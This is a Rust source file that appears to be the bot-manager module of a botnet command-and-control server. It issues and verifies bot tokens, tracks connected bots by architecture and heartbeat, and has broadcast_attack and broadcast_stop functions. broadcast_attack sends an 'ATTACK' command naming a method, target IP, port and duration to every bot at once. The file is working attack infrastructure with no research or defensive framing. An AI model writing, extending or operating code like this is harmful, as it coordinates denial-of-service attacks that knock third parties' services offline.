use tokio::sync::Mutex;
use std::sync::Arc;
use std::net::SocketAddr;
use chrono::{DateTime, Utc};
use uuid::Uuid;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use tokio::fs;
use sha2::{Sha256, Digest};
use dashmap::DashMap;

/// Bot token information for authentication
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BotToken {
    pub token_hash: String,  // SHA256 hash of token
    pub bot_id: Uuid,
    pub arch: String,
    pub created_at: DateTime<Utc>,
    pub last_used: Option<DateTime<Utc>>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BotInfo {
    pub id: Uuid,
    pub arch: String,
    pub version: String,
    pub ip: SocketAddr,
    pub connected_at: DateTime<Utc>,
    pub last_seen: DateTime<Utc>,
    pub is_alive: bool,
    pub active_attack_id: Option<usize>,
    pub last_error: Option<String>,
}

impl BotInfo {
    pub fn new(ip: SocketAddr, arch: String, version: String) -> Self {
        let now = Utc::now();
        Self {
            id: Uuid::new_v4(),
            arch,
            version,
            ip,
            connected_at: now,
            last_seen: now,
            is_alive: true,
            active_attack_id: None,
            last_error: None,
        }
    }
    
    pub fn update_last_seen(&mut self) {
        self.last_seen = Utc::now();
    }

    pub fn set_error(&mut self, error: String) {
        self.last_error = Some(error);
    }
}

pub struct Bot {
    pub info: Arc<Mutex<BotInfo>>,
    pub cmd_tx: tokio::sync::mpsc::Sender<String>,
}

impl Bot {
    pub fn new(addr: SocketAddr, arch: String, version: String, cmd_tx: tokio::sync::mpsc::Sender<String>) -> Self {
        Self {
            info: Arc::new(Mutex::new(BotInfo::new(addr, arch, version))),
            cmd_tx,
        }
    }
}

pub struct BotManager {
    bots: Arc<DashMap<Uuid, Arc<Bot>>>,
    max_connections: usize,
    bot_tokens: Arc<DashMap<String, BotToken>>,
    tokens_file: String,
}

impl BotManager {
    pub fn new(max_connections: usize, tokens_file: String) -> Self {
        Self {
            bots: Arc::new(DashMap::new()),
            max_connections,
            bot_tokens: Arc::new(DashMap::new()),
            tokens_file,
        }
    }
    
    /// Load bot tokens from file
    pub async fn load_tokens(&self) -> Result<(), String> {
        if !std::path::Path::new(&self.tokens_file).exists() {
            return Ok(());  // No tokens file yet
        }
        
        let contents = fs::read_to_string(&self.tokens_file).await
            .map_err(|e| format!("Failed to read tokens file: {}", e))?;
        
        let tokens: HashMap<String, BotToken> = serde_json::from_str(&contents)
            .map_err(|e| format!("Failed to parse tokens file: {}", e))?;
        
        for (k, v) in tokens {
            self.bot_tokens.insert(k, v);
        }
        tracing::info!("Loaded {} bot tokens", self.bot_tokens.len());
        Ok(())
    }
    
    /// Hash a token using SHA256
    fn hash_token(token: &str) -> String {
        let mut hasher = Sha256::new();
        hasher.update(token.as_bytes());
        format!("{:x}", hasher.finalize())
    }
    
    /// Save bot tokens to file
    async fn save_tokens(&self) -> Result<(), String> {
        let tokens: HashMap<String, BotToken> = self.bot_tokens.iter().map(|r| (r.key().clone(), r.value().clone())).collect();
        let json = serde_json::to_string_pretty(&tokens)
            .map_err(|e| format!("Failed to serialize tokens: {}", e))?;
        
        // Ensure config directory exists
        if let Some(parent) = std::path::Path::new(&self.tokens_file).parent() {
            tokio::fs::create_dir_all(parent).await
                .map_err(|e| format!("Failed to create config directory: {}", e))?;
        }
        
        fs::write(&self.tokens_file, json).await
            .map_err(|e| format!("Failed to write tokens file: {}", e))?;
        
        Ok(())
    }
    
    /// Register a new bot and return its token (ONLY SHOWN ONCE!)
    pub async fn register_bot(&self, arch: String) -> Result<(Uuid, String), String> {
        let bot_id = Uuid::new_v4();
        let token = generate_secure_token(64);  // 64 char token for better security
        
        // Hash the token for storage - never store plaintext!
        let token_hash = Self::hash_token(&token);
        
        let bot_token = BotToken {
            token_hash: token_hash.clone(),
            bot_id,
            arch,
            created_at: Utc::now(),
            last_used: None,
        };
        
        self.bot_tokens.insert(token_hash, bot_token);
        self.save_tokens().await?;
        
        tracing::info!("Registered new bot {} - TOKEN WILL BE SHOWN ONLY ONCE!", bot_id);
        Ok((bot_id, token))
    }
    
    /// Verify a bot token and return bot ID and arch if valid
    pub async fn verify_bot_token(&self, token: &str) -> Option<(Uuid, String)> {
        let token_hash = Self::hash_token(token);
        
        if let Some(mut bot_token) = self.bot_tokens.get_mut(&token_hash) {
            bot_token.last_used = Some(Utc::now());
            let bot_id = bot_token.bot_id;
            let arch = bot_token.arch.clone();
            drop(bot_token); // Release lock
            let _ = self.save_tokens().await;  // Update last_used time
            Some((bot_id, arch))
        } else {
            None
        }
    }
    
    /// Revoke a bot token by Bot ID
    pub async fn revoke_token(&self, bot_id: Uuid) -> Result<(), String> {
        // Find the token hash associated with this bot_id
        let mut token_hash_to_remove = None;
        
        for entry in self.bot_tokens.iter() {
            if entry.value().bot_id == bot_id {
                token_hash_to_remove = Some(entry.key().clone());
                break;
            }
        }
        
        if let Some(hash) = token_hash_to_remove {
            self.bot_tokens.remove(&hash);
            self.save_tokens().await?;
            tracing::info!("Revoked bot token for bot {}", bot_id);
            Ok(())
        } else {
            Err(format!("No token found for bot ID {}", bot_id))
        }
    }
    
    /// List all registered bot tokens
    pub async fn list_tokens(&self) -> Vec<BotToken> {
        self.bot_tokens.iter().map(|r| r.value().clone()).collect()
    }
    
    pub async fn add_bot(&self, bot: Bot) -> Result<Arc<Bot>, String> {
        if self.bots.len() >= self.max_connections {
            return Err(format!("Max bot connections reached: {}", self.max_connections));
        }
        
        let bot_id = bot.info.lock().await.id;
        let bot_arc = Arc::new(bot);
        self.bots.insert(bot_id, bot_arc.clone());
        Ok(bot_arc)
    }
    
    pub async fn remove_bot(&self, bot_id: &Uuid) {
        self.bots.remove(bot_id);
    }
    
    pub async fn get_bot_count(&self) -> usize {
        self.bots.len()
    }
    
    pub async fn get_all_bots(&self) -> Vec<Arc<Bot>> {
        self.bots.iter().map(|r| r.value().clone()).collect()
    }
    
    #[allow(dead_code)]
    pub async fn get_bots_by_arch(&self, arch: &str) -> Vec<Arc<Bot>> {
        let mut result = Vec::new();
        
        for bot in self.bots.iter() {
            let info = bot.value().info.lock().await;
            if info.arch == arch {
                result.push(bot.value().clone());
            }
        }
        
        result
    }
    
    pub async fn update_bot_heartbeat(&self, bot_id: &Uuid) {
        if let Some(bot) = self.bots.get(bot_id) {
            let mut info = bot.info.lock().await;
            info.update_last_seen();
        }
    }

    pub async fn set_bot_error(&self, bot_id: &Uuid, error: String) {
        if let Some(bot) = self.bots.get(bot_id) {
            let mut info = bot.info.lock().await;
            info.set_error(error);
        }
    }
    
    pub async fn cleanup_dead_bots(&self, timeout_secs: i64) {
        let now = Utc::now();
        let mut to_remove = Vec::new();
        
        for bot in self.bots.iter() {
            let info = bot.value().info.lock().await;
            let elapsed = now.signed_duration_since(info.last_seen);
            if elapsed.num_seconds() >= timeout_secs {
                to_remove.push(*bot.key());
            }
        }
        
        for id in to_remove {
            self.bots.remove(&id);
        }
    }
    
    /// Broadcast stop command to all bots for a specific attack
    pub async fn broadcast_stop(&self, attack_id: usize) {
        let command = format!("STOP {}\n", attack_id);
        let bots = self.get_all_bots().await;
        
        for bot in bots {
            if let Err(e) = bot.cmd_tx.send(command.clone()).await {
                tracing::debug!("Failed to send stop command to bot: {}", e);
            }
        }
    }
    
    /// Broadcast attack command to all bots
    pub async fn broadcast_attack(&self, method: &str, ip: &str, port: u16, duration: u64) {
        let command = format!("ATTACK {} {} {} {}\n", method, ip, port, duration);
        let bots = self.get_all_bots().await;
        
        for bot in bots {
            if let Err(e) = bot.cmd_tx.send(command.clone()).await {
                tracing::debug!("Failed to send attack command to bot: {}", e);
            }
        }
    }
}

/// Generate a secure random token
fn generate_secure_token(length: usize) -> String {
    use rand::Rng;
    const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let mut rng = rand::rngs::OsRng;
    
    (0..length)
        .map(|_| {
            let idx = rng.gen_range(0..CHARSET.len());
            CHARSET[idx] as char
        })
        .collect()
}
